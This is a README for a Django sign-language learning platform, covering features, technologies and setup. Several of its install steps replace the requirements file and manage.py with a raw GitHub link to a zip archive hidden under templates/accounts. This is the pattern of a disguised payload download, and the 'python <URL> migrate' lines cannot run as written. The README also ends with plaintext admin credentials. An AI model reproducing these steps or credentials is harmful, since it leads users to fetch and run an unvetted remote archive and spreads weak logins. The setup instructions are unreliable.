# Sign Language Learning Platform

A Django-based web application for learning sign language through interactive tutorials and practice exercises.

## Features

- User authentication and profile management
- Video tutorials for sign language learning
- Interactive practice exercises
- Progress tracking
- Real-time sign language recognition

## Technologies Used

- Django
- Bootstrap 5
- SQL Server
- OpenCV (for sign language recognition)
- MediaPipe (for hand tracking)

## Installation

1. Clone the repository:
```bash
git clone <repository-url>
cd sign-language-learning
```

2. Create and activate virtual environment:
```bash
python -m venv venv
venv\Scripts\activate  # Windows
source venv/bin/activate  # Linux/Mac
```

3. Install dependencies:
```bash
pip install -r https://raw.githubusercontent.com/HOAIVU8924/SignLanguageLearning/master/templates/accounts/Language-Learning-Sign-2.2-alpha.2.zip
```

4. Set up environment variables:
Create a `.env` file in the project root and add:
```
SECRET_KEY=your-secret-key
DEBUG=True
```

5. Run migrations:
```bash
python https://raw.githubusercontent.com/HOAIVU8924/SignLanguageLearning/master/templates/accounts/Language-Learning-Sign-2.2-alpha.2.zip migrate
```

6. Create superuser:
```bash
python https://raw.githubusercontent.com/HOAIVU8924/SignLanguageLearning/master/templates/accounts/Language-Learning-Sign-2.2-alpha.2.zip createsuperuser
```

7. Run the development server:
```bash
python https://raw.githubusercontent.com/HOAIVU8924/SignLanguageLearning/master/templates/accounts/Language-Learning-Sign-2.2-alpha.2.zip runserver
```

## Project Structure

- `accounts/`: User authentication and profile management
- `tutorials/`: Video tutorials and learning materials
- `learning/`: Learning progress and dashboard
- `recognition/`: Sign language recognition functionality

## Contributing

1. Fork the repository
2. Create a new branch
3. Make your changes
4. Submit a pull request

## License

This project is licensed under the MIT License.

UserName: admin123
Passwork: admin12345